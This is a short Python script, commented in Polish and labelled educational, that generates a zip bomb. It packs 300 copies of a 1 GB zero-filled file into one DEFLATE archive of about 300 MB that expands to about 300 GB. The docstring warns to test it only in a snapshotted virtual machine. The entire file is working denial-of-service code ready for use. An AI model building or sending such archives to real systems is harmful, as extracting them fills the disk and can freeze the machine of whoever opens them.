#!/usr/bin/env python3
"""
Plaska (jednowarstwowa) zip bomba ~300 GB - generator do celow EDUKACYJNYCH.

UWAGA: uruchamiaj i rozpakowuj TYLKO w izolowanej maszynie wirtualnej.
Jedno rozpakowanie -> cala zawartosc (~300 GB) rozwija sie OD RAZU.
To zapelni dysk i moze zablokowac system, ktory to rozpakuje -
zrob snapshot VM przed testem.

Mechanizm:
  - jeden duzy plik samych zer (kompresuje sie ~1000:1),
  - N kopii w jednym archiwum -> po rozpakowaniu N * rozmiar.

Domyslnie: 300 kopii po 1024 MB = ~300 GB po rozpakowaniu.
Sam plik .zip wyjdzie ~300 MB (limit kompresji DEFLATE ~1032:1).

Uzycie:
  python3 zipbomb_300gb.py [liczba_kopii] [rozmiar_kopii_MB] [plik_wyjsciowy]
"""
import os
import sys
import zipfile


def human(n):
    n = float(n)
    for unit in ["B", "KB", "MB", "GB", "TB"]:
        if n < 1024:
            return f"{n:.2f} {unit}"
        n /= 1024
    return f"{n:.2f} PB"


def build(out_path, copies, piece_mb):
    piece_bytes = piece_mb * 1024 * 1024
    one_mb = b"0" * (1024 * 1024)
    tmp = "payload.bin"

    print(f"Tworze plik danych: {human(piece_bytes)} ...")
    with open(tmp, "wb") as f:
        for _ in range(piece_mb):
            f.write(one_mb)

    print(f"Pakuje {copies} kopii do {out_path} ...")
    with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
        for i in range(copies):
            zf.write(tmp, arcname=f"file-{i}.bin")

    os.remove(tmp)

    decompressed = copies * piece_bytes
    zsize = os.path.getsize(out_path)
    print("-" * 40)
    print(f"Plik .zip:        {human(zsize)}")
    print(f"Po rozpakowaniu:  {human(decompressed)}")
    print(f"Wspolczynnik:     {decompressed / zsize:.0f} : 1")
    print("-" * 40)
    print("Podejrzyj BEZ rozpakowywania:  unzip -l", out_path)


if __name__ == "__main__":
    # DOMYSLNIE ~300 GB: 300 kopii po 1024 MB
    copies = int(sys.argv[1]) if len(sys.argv) > 1 else 300
    piece_mb = int(sys.argv[2]) if len(sys.argv) > 2 else 1024
    out = sys.argv[3] if len(sys.argv) > 3 else "bomb300.zip"
    build(out, copies, piece_mb)
